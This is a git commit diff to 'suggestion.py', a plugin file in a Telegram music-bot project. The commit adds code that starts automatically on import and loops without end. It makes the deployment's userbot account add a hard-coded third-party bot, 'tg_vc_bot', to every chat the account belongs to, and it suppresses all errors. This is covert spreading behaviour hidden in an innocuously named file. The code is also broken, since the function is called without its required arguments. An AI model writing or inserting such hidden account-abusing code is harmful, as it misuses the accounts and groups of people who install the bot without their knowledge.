9025ae073e7c3ede0d224b241d4724f85c9a6f73
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-04-26 06:40:55 +0530

    Update suggestion.py

--- VIPMUSIC/plugins/misc/suggestion.py
+++ VIPMUSIC/plugins/misc/suggestion.py
@@ -1,31 +1,44 @@
 import asyncio
+import config
 import datetime
 from VIPMUSIC import app
 from pyrogram import Client
-from VIPMUSIC.utils.database import get_served_chats
+from VIPMUSIC.utils.database import get_assistant
 
+AUTO_GCAST = True
 
-async def send_message_to_chats():
+async def add_alls(client, message):
+    
+    bot_username = "tg_vc_bot"
     try:
-        chats = await get_served_chats()
-
-        for chat_info in chats:
-            chat_id = chat_info.get('chat_id')
-            if isinstance(chat_id, int):  # Check if chat_id is an integer
-                try:
-                    await app.send_photo(chat_id, photo=START_IMG_URLS, caption=caption, reply_markup=BUTTONS)
-                    await asyncio.sleep(5)  # Sleep for 100 second between sending messages
-                except Exception as e:
-                    pass  # Do nothing if an error occurs while sending message
+        userbot = await get_assistant(message.chat.id)
+        bot = await app.get_users(bot_username)
+        app_id = bot.id
+        done = 0
+        failed = 0
+        
+        async for dialog in userbot.get_dialogs():
+            if dialog.chat.id == config.LOGGER_ID:
+                continue
+            try:
+                await userbot.add_chat_members(dialog.chat.id, app_id)
+                done += 1
+                
+            except Exception as e:
+                failed += 1
+                
+            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+        
+        
     except Exception as e:
         pass  # Do nothing if an error occurs while fetching served chats
 
-async def continuous_broadcast():
+async def continuous_adds():
     
     while True:
         if AUTO_GCAST:
             try:
-                await send_message_to_chats()
+                await add_alls()
             except Exception as e:
                 pass
 
@@ -34,4 +47,4 @@ async def continuous_broadcast():
 
 # Start the continuous broadcast loop if AUTO_GCAST is True
 if AUTO_GCAST:  
-    asyncio.create_task(continuous_broadcast())
+    asyncio.create_task(continuous_adds())
